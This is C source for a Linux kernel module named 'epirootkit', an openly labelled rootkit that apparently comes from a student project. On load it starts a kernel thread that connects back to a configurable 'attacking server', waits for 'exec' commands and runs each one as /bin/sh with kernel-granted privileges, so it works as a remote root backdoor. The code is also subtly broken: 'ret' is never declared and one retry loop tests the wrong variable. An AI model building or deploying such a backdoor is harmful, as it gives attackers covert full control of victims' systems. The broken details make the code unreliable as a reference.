#include <linux/module.h>
#include <linux/net.h>
#include <linux/inet.h>
#include <linux/delay.h>
#include <linux/fs.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/init.h>
#include <linux/string.h>
#include <linux/file.h>
#include <linux/kernel.h>
#include <linux/kmod.h>
#include <linux/kthread.h>
#include <linux/sched.h>

#define SUCCESS 0
#define FAILURE 1

#define MAX_SENDING_MSG_ATTEMPTS 10
#define TIMEOUT_BEFORE_RETRY 1000
#define RCV_CMD_BUFFER_SIZE 1024
#define STD_BUFFER_SIZE 4096

static struct socket *sock = NULL;
static struct task_struct *network_thread = NULL;
static bool thread_exited = false;

static char *ip = "127.0.0.1";
static int port = 4242;
static char *message = "epirootkit: connexion established\n";

module_param(ip, charp, 0644);
module_param(port, int, 0644);
module_param(message, charp, 0644);

MODULE_PARM_DESC(ip, "IPv4 of attacking server");
MODULE_PARM_DESC(port, "Port of attacking server");
MODULE_PARM_DESC(message, "Message to send to the attacking server");

/**
 * @brief Closes the communication by releasing the socket.
 *
 * @return SUCCESS
 */
static int close_comm(void)
{
	if (sock) {
		sock_release(sock);
		sock = NULL;
		pr_info("epirootkit: close_comm: socket released\n");
	}
	return SUCCESS;
}

/**
 * @brief Stops the network thread if it is running.

 * @return SUCCESS Always returns SUCCESS upon completion.
 */
static int close_thread(void)
{
	if (network_thread) {
		if (!thread_exited)
			kthread_stop(network_thread);
		pr_info("epirootkit: close_thread: thread stopped\n");
	}
	return SUCCESS;
}

/**
 * @brief Cleans up resources used by the program.
 *
 * @return SUCCESS on successful cleanup.
 */
static int cleanup(void)
{
	close_thread();
	close_comm();
	return SUCCESS;
}

/**
 * @brief Executes a command string in user mode.
 * 
 * @param user_cmd A pointer to a null-terminated string containing the command to execute.
 * @return int - Returns 0 on success, -ENOMEM if memory allocation fails, or -ENOENT if the output file cannot be opened.
 */
static int exec_str_as_command(char *user_cmd)
{
	struct subprocess_info *sub_info = NULL;							// Structure used to spawn a userspace process
	struct file *file = NULL;				 	 	 	 	 	 	  	// File pointer to read the output of the command
	char *cmd = NULL;
	char *argv[] = { "/bin/sh", "-c", NULL, NULL };
	char *envp[] = { "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
	char *output_file = "/tmp/kernel_exec_output";
	char *buf = NULL;
	loff_t pos = 0;														// File read position
	int status = 0, len = 0;											// Return code and number of bytes read

	// Allocate memory for the command string
	cmd = kmalloc(4096, GFP_KERNEL);
	if (!cmd)
		return -ENOMEM;

	// Construct the full shell command with output redirection
	snprintf(cmd, 4096, "%s > %s 2>&1", user_cmd, output_file);
	argv[2] = cmd;

	pr_info("epirootkit: exec_str_as_command: executing command: %s\n", cmd);

	// Prepare to run the command
	sub_info = call_usermodehelper_setup(argv[0], argv, envp, GFP_KERNEL, NULL, NULL, NULL);
	if (!sub_info) {
		kfree(cmd);
		return -ENOMEM;
	}

	// Execute the command and wait for it to finish
	status = call_usermodehelper_exec(sub_info, UMH_WAIT_PROC);
	pr_info("epirootkit: exec_str_as_command: command exited with status: %d\n", status);

	// Read the output from the file and print it
	file = filp_open(output_file, O_RDONLY, 0);
	if (IS_ERR(file)) {
		kfree(cmd);
		return -ENOENT;
	}

	// Allocate a buffer to store the file content
	buf = kmalloc(4096, GFP_KERNEL);
	if (!buf) {
		filp_close(file, NULL);
		kfree(cmd);
		return -ENOMEM;
	}

	// Read from the file into the buffer
	len = kernel_read(file, buf, 4096 - 1, &pos);
	if (len >= 0) {
		buf[len] = '\0';
		pr_info("epirootkit: exec_str_as_command: command output:\n%s", buf);
	}

	// Cleanup: free memory and close file
	kfree(buf);
	filp_close(file, NULL);
	kfree(cmd);
	return SUCCESS;
}

/**
 * @brief Kernel thread function for managing network communication.
 *
 * @param data Pointer to thread-specific data (unused in this implementation).
 * @return int Returns SUCCESS on successful execution, or FAILURE on error.
 *
 * @note The thread will periodically retry operations such as connecting to the server
 *       or sending messages if they fail.
 */
static int network_worker(void *data)
{
	struct sockaddr_in addr = { 0 };
	struct msghdr msg = { 0 };
	struct kvec vec = { 0 };
	unsigned char ip_binary[4] = { 0 };
	int ret_code = 0;

	// Convert IP address string into 4-byte binary format
	if (!in4_pton(ip, -1, ip_binary, -1, NULL)) {
		pr_err("epirootkit: network_worker: invalid IPv4\n");
		return FAILURE;
	}

	// Create a TCP socket in kernel space
	ret = sock_create(AF_INET, SOCK_STREAM, IPPROTO_TCP, &sock);
	if (ret < 0) {
		pr_err("epirootkit: network_worker: socket creation failed: %d\n", ret);
		return FAILURE;
	}

	// Prepare the sockaddr_in structure for the server we want to connect to
	addr.sin_family = AF_INET;
	addr.sin_port = htons(port);
	memcpy(&addr.sin_addr.s_addr, ip_binary, sizeof(addr.sin_addr.s_addr));

	// Attempt to connect to the remote server
	// Retry periodically until the thread is stopped or the connection succeeds
	while (!kthread_should_stop()) {
		ret = sock->ops->connect(sock, (struct sockaddr *)&addr, sizeof(addr), 0);
		if (ret < 0) {
			pr_err("epirootkit: network_worker: failed to connect to %s:%d (%d), retrying...\n", ip, port, ret);
			msleep(TIMEOUT_BEFORE_RETRY);
			continue;
		}

		// Connection successful
		break; 
	}

	vec.iov_base = (void *)message;
	vec.iov_len = strlen(message);

	// Attempt to send the initial message
	int attempts = 0;
	do {
		ret = kernel_sendmsg(sock, &msg, &vec, 1, vec.iov_len);
		if (ret < 0) {
			pr_err("epirootkit: network_worker: failed to send message: %d, retrying... (attempt %d/%d)\n", ret, attempts + 1, MAX_SENDING_MSG_ATTEMPTS);
			msleep(TIMEOUT_BEFORE_RETRY);
			attempts++;
		}
	} while (ret_code < 0 && attempts < MAX_SENDING_MSG_ATTEMPTS);

	// If all attempts to send the message failed, abort
	if (ret < 0) {
		pr_err("epirootkit: network_worker: failed to send message after 10 attempts, giving up.\n");
		return FAILURE;
	}

	pr_info("epirootkit: network_worker: message sent to %s:%d\n", ip, port);

	// Listen for commands
	// Retry until 'killcom' is received or thread is stopped by unmonting the module
	while (!kthread_should_stop()) {
		struct kvec recv_vec;
		struct msghdr recv_msg = { 0 };
		char recv_buffer[RCV_CMD_BUFFER_SIZE] = { 0 };

		recv_vec.iov_base = recv_buffer;
		recv_vec.iov_len = sizeof(recv_buffer) - 1;

		// Wait to receive a message from the server
		ret = kernel_recvmsg(sock, &recv_msg, &recv_vec, 1, recv_vec.iov_len, 0);
		if (ret < 0) {
			pr_err("epirootkit: network_worker: error receiving message: %d\n", ret);
			msleep(TIMEOUT_BEFORE_RETRY);
			continue;
		}

		// Null-terminate the received message
		recv_buffer[ret] = '\0';
		pr_info("epirootkit: network_worker: received: %s", recv_buffer);

		// Parse and handle the received command
		if (strncmp(recv_buffer, "exec ", 5) == 0) {
			char *command = recv_buffer + 5;
			command[strcspn(command, "\n")] = '\0';
			pr_info("network_worker: executing command: %s\n", command);
			exec_str_as_command(command);
		} else if (strncmp(recv_buffer, "killcom", 7) == 0) {
			pr_info("network_worker: killcom received, exiting...\n");
			break;
		}

		// To be continued...
	}

	// Final cleanup before thread exits
	pr_info("epirootkit: network_worker: thread ends.\n");
	thread_exited = true;
	close_comm();

	return SUCCESS;
}

/**
 * @brief Initializes the epirootkit module.
 *
 * @return Returns 0 (SUCCESS) on successful initialization, or a negative
 * error code if the kernel thread fails to start.
 */
static int __init epirootkit_init(void)
{
	pr_info("epirootkit: epirootkit_init: module loaded (/^▽^)/\n");

	// Start a kernel thread that will handle network communication
	network_thread = kthread_run(network_worker, NULL, "netcom_thread");
	if (IS_ERR(network_thread)) {
		pr_err("epirootkit: epirootkit_init: failed to start thread\n");
		return PTR_ERR(network_thread);
	}

	return SUCCESS;
}

/**
 * @brief Cleanup function called when the module is unloaded.
 *
 * This function is executed during the module's exit phase. 
 */
static void __exit epirootkit_exit(void)
{
	cleanup();
	pr_info("epirootkit: epirootkit_exit: module unloaded\n");
}


module_init(epirootkit_init);
module_exit(epirootkit_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("STDBOOL");
MODULE_DESCRIPTION("MTF Rootkit - EPI Rootkit");